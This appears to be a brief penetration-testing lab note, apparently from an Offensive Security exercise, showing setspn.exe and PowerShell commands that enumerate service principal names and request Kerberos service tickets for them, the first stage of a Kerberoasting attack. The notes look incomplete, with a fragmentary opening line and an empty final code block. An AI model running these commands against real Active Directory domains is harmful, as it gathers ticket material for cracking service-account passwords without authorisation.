# Enumerating SPNs

running on the target system.

---

## PoC

Enumerate SPN's

```
setspn.exe -Q */*
```

Download/request TGS Ticket for specific user.

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DC.access.offsec"
```

Retrieve all of the tickets for said SPN

```
setspn.exe -T access.offsec -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```


```

```
